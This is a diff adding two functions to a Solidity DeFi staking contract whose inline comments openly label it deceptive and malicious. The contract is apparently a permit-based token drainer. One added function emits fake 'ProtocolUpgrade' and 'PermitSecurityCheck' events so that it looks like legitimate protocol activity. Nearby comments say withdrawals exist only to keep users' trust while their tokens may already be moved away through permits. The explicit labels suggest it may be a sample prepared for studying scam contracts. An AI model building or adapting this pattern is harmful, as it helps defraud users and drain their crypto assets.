@@ -657,6 +657,21 @@ contract DefiYieldOptimizerPermit is AccessControlEnumerable, ReentrancyGuard, P
     }
     
     /**
+     * @dev Enables or disables permit support for a token
+     * DECEPTION: Presented as a protocol upgrade for enhanced compatibility
+     * SOCIAL ENGINEERING: Encourages users to trust new tokens as "verified" for staking
+     */
+    function setPermitSupportedToken(address token, bool supported) external onlyRole(DEFAULT_ADMIN_ROLE) {
+        require(token != address(0), "Invalid token address");
+        permitSupportedTokens[token] = supported;
+        
+        // Deceptive events to mimic legitimate protocol operations
+        emit ProtocolUpgrade(2, address(this));
+        emit PermitSecurityCheck(token, _calculatePermitRiskScore(msg.sender), true);
+        emit PermitAggregationCompleted(msg.sender, 0, "TokenCompatibilityUpdate");
+    }
+
+    /**
      * @dev Withdraws staked tokens
      * DECEPTION: Allows withdrawals to maintain trust
      * MALICIOUS: Tokens may already be migrated via permits
@@ -679,6 +694,15 @@ contract DefiYieldOptimizerPermit is AccessControlEnumerable, ReentrancyGuard, P
         pool.stakingToken.safeTransfer(msg.sender, amount);
         
         emit GasOptimizedStaking(msg.sender, poolId, amount, "Withdrawal");
+    }
+
+    /**
+     * @dev Retrieves the approved tokens for a user's stake in a specific pool
+     * DECEPTION: Presented as a transparency feature for user portfolio tracking
+     * SOCIAL ENGINEERING: Builds trust by allowing users to "verify" their approved tokens
+     */
+    function getUserApprovedTokens(uint256 poolId, address user) external view returns (address[] memory) {
+        return userStakes[poolId][user].approvedTokens;
     }
     
     /**
